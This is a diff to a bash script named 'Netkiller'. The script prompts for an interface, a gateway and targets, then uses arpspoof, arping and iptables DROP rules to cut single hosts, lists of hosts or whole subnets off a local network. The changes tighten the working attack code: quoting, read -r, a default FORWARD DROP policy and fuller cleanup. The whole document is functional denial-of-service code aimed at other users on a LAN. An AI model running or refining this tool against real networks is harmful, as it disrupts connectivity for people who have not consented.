@@ -42,13 +42,13 @@ echo "[*] Subnet IP: $CIDR"
 echo "[*] Device IP: $IP"
 echo ""
 
-read -p "Enter Wireless Interface: " INTERFACE
+read -rp "Enter Wireless Interface: " INTERFACE
 echo ""
 
-read -p "Enter Router Gateway IP: " GATEWAY
+read -rp "Enter Router Gateway IP: " GATEWAY
 echo ""
 
-read -p "Enter Subnet Mask (e.g 10.0.0.0/20): " NETWORK_CIDR
+read -rp "Enter Subnet Mask (e.g 10.0.0.0/20): " NETWORK_CIDR
 echo ""
 
 MYIP="$IP"
@@ -67,27 +67,27 @@ echo "2) Multiple Target IP's (comma separated)"
 echo "3) Target All IP's in Subnet"
 
 echo ""
-read -p "Enter choice [1-3]: " target_type
+read -rp "Enter choice [1-3]: " target_type
 echo ""
 
 case $target_type in
     1)
         echo "Single Target User IP: e.g 10.0.0.123"
-        read -p "Enter User IP: " TARGET
-        TARGETS=($TARGET)
+        read -rp "Enter User IP: " TARGET
+        TARGETS=("$TARGET")
         ;;
     2)
         echo "Multiple Target Users IP's: e.g 10.0.0.123,10.0.0.124"
-        read -p "Enter Multiple Users IP's:  " target_input
+        read -rp "Enter Multiple Users IP's: " target_input
         IFS=',' read -ra TARGETS <<< "$target_input"
         ;;
     3)
         echo "Target All Users IP's in Subnet: e.g 10.0.0.1/20"
-        read -p "Enter Subnet: " subnet
+        read -rp "Enter Subnet: " subnet
 
         # Validate subnet
         if ! ipcalc -n "$subnet" &>/dev/null; then
-            echo "Invalid subnet format. Please use CIDR notation e.g 10.0.0.1/20"
+            echo "Invalid subnet format. Please use CIDR notation e.g 10.0.0.1/20" >&2
             exit 1
         fi
 
@@ -99,10 +99,9 @@ case $target_type in
         FIRST_HOST=$(echo "$NETWORK_INFO" | grep 'HostMin:' | awk '{print $2}')
         LAST_HOST=$(echo "$NETWORK_INFO" | grep 'HostMax:' | awk '{print $2}')
 
-
         # Generate all IPs in range except gateway and our IP
         IFS=. read -r i1 i2 i3 i4 <<< "$FIRST_HOST"
-        IFS=. read -r <<< "$LAST_HOST" l1 l2 l3 l4
+        IFS=. read -r l1 l2 l3 l4 <<< "$LAST_HOST"
 
         TARGETS=()
         for ((a=i1; a<=l1; a++)); do
@@ -120,7 +119,7 @@ case $target_type in
         done
 
         if [ ${#TARGETS[@]} -eq 0 ]; then
-            echo "No valid targets found in subnet."
+            echo "No valid targets found in subnet." >&2
             exit 1
         fi
 
@@ -129,11 +128,11 @@ case $target_type in
 
         # Option to exempt additional IPs
         echo ""
-        read -p "Do you want to exempt any additional IP's from the subnet attack? (y/n) " exempt_choice
+        read -rp "Do you want to exempt any additional IP's from the subnet attack? (y/n) " exempt_choice
         if [[ "$exempt_choice" =~ ^[Yy]$ ]]; then
             echo ""
             echo "Enter IP's to exempt: e.g 10.0.0.110,10.0.0.120"
-            read -p "> " exempt_input
+            read -rp "> " exempt_input
             IFS=',' read -ra EXEMPTS <<< "$exempt_input"
 
             # Remove exempt IPs from targets
@@ -154,44 +153,45 @@ case $target_type in
         fi
         ;;
     *)
-        echo "Invalid choice"
+        echo "Invalid choice" >&2
         exit 1
         ;;
 esac
 
 if [ ${#TARGETS[@]} -eq 0 ]; then
-    echo "No valid targets specified."
+    echo "No valid targets specified." >&2
     exit 1
 fi
 
 # Confirm before proceeding
 echo -e "\nNumber of target IP's affected: ${#TARGETS[@]}"
 echo ""
-read -p "Are you sure you want to continue? (y/n) " confirm
+read -rp "Are you sure you want to continue? (y/n) " confirm
 if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
     echo "Aborted."
     exit 0
 fi
 
+# Iptables policy
+iptables -P FORWARD DROP
+
 # Start ARP spoofing for each target
 PIDS=()
 for TARGET in "${TARGETS[@]}"; do
     echo ""
-    echo "Netkiller kill the connection of $TARGET"
+    echo "Netkiller blocking the connection of $TARGET"
 
-    # Bidirectional arp spoofing 
+    # Bidirectional arp spoofing
     arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 &
-    PIDS+=($!)
-    arpspoof -i "$INTERFACE" -t "$GATEWAY" -r "$TARGET" >/dev/null 2>&1 &
     PIDS+=($!)
     arping -b -A -i "$INTERFACE" -S "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
     PIDS+=($!)
-      
+
     # Set iptables rules to block/drop traffic
     iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
     iptables -I FORWARD -s "$GATEWAY" ! -d "$MYIP" -j DROP
-    iptables -I FORWARD -s $TARGET -j DROP
-    iptables -I FORWARD -d $TARGET -j DROP
+    iptables -I FORWARD -s "$TARGET" -j DROP
+    iptables -I FORWARD -d "$TARGET" -j DROP
 done
 
 # Function to clean up
@@ -199,15 +199,17 @@ cleanup() {
     echo -e "\nCleaning up..."
     # Kill all arpspoof processes
     for pid in "${PIDS[@]}"; do
-        kill -9 $pid >/dev/null 2>&1
+        kill -9 "$pid" >/dev/null 2>&1
     done
 
     # Flush iptables rules
-    iptables -D FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP >/dev/null
-    iptables -D FORWARD -s "$GATEWAY" ! -d "$MYIP" -j DROP >/dev/null
+    ip -s -s neigh flush all >/dev/null 2>&1
+    iptables -P FORWARD ACCEPT
+    iptables -D FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP >/dev/null 2>&1
+    iptables -D FORWARD -s "$GATEWAY" ! -d "$MYIP" -j DROP >/dev/null 2>&1
     for TARGET in "${TARGETS[@]}"; do
-        iptables -D FORWARD -s $TARGET -j DROP >/dev/null
-        iptables -D FORWARD -d $TARGET -j DROP >/dev/null
+        iptables -D FORWARD -s "$TARGET" -j DROP >/dev/null 2>&1
+        iptables -D FORWARD -d "$TARGET" -j DROP >/dev/null 2>&1
     done
     echo ""
     echo "Restoring the connection..."
